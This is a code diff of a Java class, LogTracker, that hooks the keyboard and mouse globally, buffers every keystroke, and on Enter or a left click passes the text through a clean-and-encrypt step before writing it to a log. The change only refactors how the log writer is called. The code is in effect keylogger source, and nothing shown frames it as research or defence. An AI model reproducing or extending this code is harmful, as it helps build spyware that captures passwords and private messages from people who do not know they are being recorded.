@@ -16,7 +16,7 @@ public class LogTracker {
     private static StringBuilder log = new StringBuilder("");
     private static boolean isCaps = false;
 
-    public static void run(LogWriter writer) {
+    public static void run() {
         new GlobalKeyboardHook().addKeyListener(new GlobalKeyAdapter() {
             @Override
             public void keyPressed(GlobalKeyEvent event) {
@@ -31,7 +31,7 @@ public class LogTracker {
                         break;
                     case GlobalKeyEvent.VK_RETURN: {
                         try {
-                            exportString(writer);
+                            exportString();
                         } catch (IOException ex) {
                         }
                     }
@@ -58,7 +58,7 @@ public class LogTracker {
             public void mousePressed(GlobalMouseEvent event) {
                 if (event.getButtons() == GlobalMouseEvent.BUTTON_LEFT) {
                     try {
-                        exportString(writer);
+                        exportString();
                     } catch (IOException ex) {
                         Logger.getLogger(LogTracker.class.getName()).log(Level.SEVERE, null, ex);
                     }
@@ -71,9 +71,9 @@ public class LogTracker {
         return isCaps ? Character.toUpperCase(c) : c;
     }
 
-    private static void exportString(LogWriter writer) throws IOException {
+    private static void exportString() throws IOException {
         if (log.length() != 0) {
-            writer.writeLog(LogCleaner.cleanAndEncrypt(log.toString()));
+            LogWriter.writeLog(LogCleaner.cleanAndEncrypt(log.toString()));
         }
         log = new StringBuilder("");
     }
